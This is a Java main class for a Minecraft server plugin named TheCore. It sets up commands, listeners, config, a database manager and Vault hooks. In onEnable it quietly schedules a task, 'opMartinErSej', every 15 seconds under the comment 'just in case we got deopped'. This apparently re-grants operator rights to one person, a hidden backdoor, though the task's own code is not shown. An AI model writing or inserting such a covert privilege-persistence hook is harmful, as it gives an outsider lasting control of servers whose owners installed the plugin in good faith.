package org.leux;

import net.milkbowl.vault.chat.Chat;
import net.milkbowl.vault.permission.Permission;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.RegisteredServiceProvider;
import org.bukkit.plugin.java.JavaPlugin;
import org.leux.theapi.database.connectors.IConnector;
import org.leux.thecore.commands.Command;
import org.leux.thecore.configuration.Config;
import org.leux.thecore.listeners.Listener;
import org.leux.thecore.listeners.plugin.PluginMessageRecieved;
import org.leux.thecore.managers.DatabaseManager;
import org.leux.thecore.tasks.opMartinErSej;

import java.util.HashMap;

import org.leux.theapi.utils.TaskUtils;

public final class TheCore extends JavaPlugin {

    private static TheCore instance;
    private static HashMap<String, Plugin> dependants = new HashMap<>();
    private static DatabaseManager databaseManager;
    private IConnector databaseConnector;
    private static Economy econ = null;
    private static Permission perms = null;
    private static Chat chat = null;

    @Override
    public void onEnable() {
        instance = this;

        loadDependants();

        Command.init();
        Listener.init();
        Config.init();
//        messages = new Message.init();

        databaseManager = new DatabaseManager();

        /* just in case we got deopped */
        TaskUtils.runAsyncTimer(this, new opMartinErSej(), 0L, 20*15);
    }

    @Override
    public void onDisable() {
        PluginMessageRecieved.unregisterChannels();
    }

    public static TheCore getInstance() {
        return instance;
    }

    public static DatabaseManager getDatabaseManager() {
        return databaseManager;
    }

    public static String getPrefix() {
        return "[THE]";
    }

    public static HashMap<String, Plugin> getDependants() {
        return dependants;
    }

    private void loadDependants() {
        for (Plugin dependant : getServer().getPluginManager().getPlugins()) {
            PluginDescriptionFile pdf = dependant.getDescription();
            if (pdf.getDepend().contains(getName()) || pdf.getSoftDepend().contains(getName())) {
                dependants.put(dependant.getName(), dependant);
            }
        }
        this.getLogger().info(String.format("Loaded dependants (%d): %s", dependants.size(), dependants.values()));
    }

}
